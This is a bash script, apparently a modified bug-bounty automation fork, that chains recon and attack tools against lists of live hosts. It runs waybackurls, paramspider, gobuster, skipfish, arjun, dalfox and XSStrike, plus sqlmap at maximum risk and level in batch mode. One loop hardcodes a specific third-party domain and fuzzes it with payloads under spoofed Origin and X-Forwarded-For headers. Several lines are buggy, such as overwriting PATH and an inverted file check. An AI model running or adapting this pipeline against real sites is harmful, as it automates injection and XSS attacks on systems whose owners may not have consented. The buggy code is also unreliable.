#!/bin/bash

# snip.snip   old.mod.bountystrike.sh
# check out   -> https://github.com/BountyStrike/Bountystrike-sh <-

#  bash added for starting other hackers scripts/bins                                                                 
#  z.add -	  
#     +   gobuster
#     +   retireJS
#     +   sqlmap
#     +   dalfox
#     +   injectus
#     +   arjun
#     +   meg 
#     +   paramspider
#     +   xsstrike





contentDiscovery(){
    # Find domains urls from wayback
    cat final-domains.txt | $tools./waybackurls > waybackurls.txt

    # Maybe wayback has some uniq domains
    cat waybackurls.txt | $tools./unfurl domains | sort | uniq >> $FINAL_DOMAINS
    sort -u $FINAL_DOMAINS -o $FINAL_DOMAINS
    
     while read u
        do 
            python3 $tools/ParamSpider/paramspider.py --subs False --output psider.out.txt  -d $u | tee -a  psider.stout.log; 
            while read pay 
            do
                unj="${u/FUZZ/$pay}"; 
                echo $unj
                curl -v -v --silent -L -1 -v -H "Origin: https://svt.app" -H "X-Forwarded-For: nl.svt.app" $unj 2>&1 | egrep -i 'ZIONK|svt.app|error|syntax'>> zionk.fuzz.log;
            done<$tools/list/zionk.vul.fuzz
    done<alive.txt

    cat curl.log | egrep -i 'ZIONK|svt.app|error|syntax'
    sleep 3
    #$tools./BountyIt -t 200 -p $tools/wordlist/vul_fuzz.txt -verify | tee -a  bountyit.stout.log ;done<alive.txt
    cat psider.stout.log | grep http | sort uniq >> paramspider.finale.txt

    while read u; do $tools./getJS --complete --url $u | tee -a  alive-js-files.txt;done<alive.txt 

    sort -u  alive-js-files.txt -o alive-js-final.txt
        
    runBanner "Extracting paths from js files"
    domainExtract
    while read u; do ./resp.sh $u;done<alive.txt
    $tools./jsfiles.sh
    $tools./endpoints.sh
    cp alive.txt skipfish.do.txt
    ## meg
    # find a good wordlist to use for brutforcing with meg
  #  ~/go/bin/./meg   -v --header "Origin: https://svt.app" --header "X-Forwarded-For: nl.svt.app" quickhits.txt  alive.txt | tee -a meg.discovery-$NOW.txt
}



skipdafish(){
      
    if [ -s skipfish.do.txt ]
    then
        echo "fish file "
    else
        if pgrep -x "skipfish" > /dev/null
        then
            echo "skipfish running -timeout 300s"
            timeout 300s
            skipdafish
        else
            u=`head -n1 skipfish.do.txt`
            cat skipfish.do.txt | grep -v $u >> skipfish.do.txt
            dd=`echo $u | $tools./unfurl -u domains`
            skipfish -o $dd $u
            echo $u >> skipfish.done.txt
        fi
        
    fi
}


vulnerabilityDiscovery(){

    $tools./retire  scriptsresponse/ | tee -a retirejs-$NOW.txt
    $tools./arjun  -i alive.txt -t 40 -oT  arjun.discovery-$NOW.txt
    PATH=$(pwd)
    #while read u; do python3 $tools/ParamSpider/paramspider.py --subs False --output psider.out.txt  -d $u | .$tools/./dalfox pipe --custom-alert-value 1014 -w 300  -o $PATH/dafox.log1-$NOW.txt --format PLAIN | tee -a dafox.log.stdout.txt;done<alive.txt
    #while read u; do python3 $tools./ParamSpider/paramspider.py --subs False --output psider.out.txt  -d $u |$tools./dalfox pipe --custom-alert-value 1014 -w 300 output/psider.out.txt  -o $PATH/dafox.log1-$NOW.txt --format PLAIN | ;done<alive.txt
    #$tools./dalfox --custom-alert-value 1014 -w 300 file output/psider.out.txt  -o $PATH/dafox.log1-$NOW.txt --format PLAIN | tee -a dafox.stdout1.log
    while read u
    do  
        while read pay; 
        do
            u="https://www.randstad.no/FUZZ"
            unj="${u/FUZZ/$pay}"; 
            echo $unj
            curl  -vvvv -H "Origin: https://svt.app" -H "X-Forwarded-For: nl.svt.app" $unj --trace-ascii curl.tmp | tee -a curlfuzz.log
            #-o resp.tmp 
            
        done<$tools/list/zionk.vul.fuzz
           
    done<paramspider.finale.txt
    $tools./dalfox --custom-alert-value 1014 -w 300 file paramspider.finale.txt  -o $PATH/dafox.log1-$NOW.txt --format PLAIN | tee -a dafox.stdout1.log
    $tools./dalfox --custom-alert-value 1014 -w 300 file arjun.discovery-$NOW.txt  -o $PATH/dafox.log2-$NOW.txt --format PLAIN | tee -a dafox.stdout2.log
   # while read u; do timestamp=$(date +%s);echo $u; python3 $tools/XSStrike/xsstrike.py --file-log-level VULN --log-file xsstrike.$timestamp  --crawl -l 10 -t 70 --console-log-level DEBUG -u $u | tee -a xsstrike-$NOW.txt;done<paramspider.finale.txt
    timestamp=$(date +%s)
    while read u;do gobuster dir -r  -u $u  -t 50 -w $tools/lists/webmerged.txt | tee -a gobuster.final-$NOW.txt;done<alive.txt
    skipdafish
    $tools./meg   -v --header "HOST: svt.app" --header "X-Forwarded-For: nl.svt.app" ~/go/bin/mpays  alive.txt | tee -a meg.rederict-$NOW.txt
    sort -u arjun.discovery-$NOW.txt -o arjun.final-$NOW.txt
    python3 $tools/Injectus/Injectus.py -f arjun.final-$NOW.txt -w 20 | tee -a injectus.out-$NOW.txt
    while read u; do timestamp=$(date +%s);echo $u; python3 $tools/XSStrike/xsstrike.py --file-log-level VULN --log-file xsstrike.$timestamp  -t 70 --console-log-level DEBUG -u $u | tee -a xsstrike-$NOW.txt;done<arjun.final-$NOW.txt
    while read u; do timestamp=$(date +%s);echo $u; sqlmap -u $u --user-agent=random --threads=10 -vv --batch --risk 3 --level 5 --flush-session | tee -a sqlmap-$NOW.txt;done<arjun.final-$NOW.txt
}
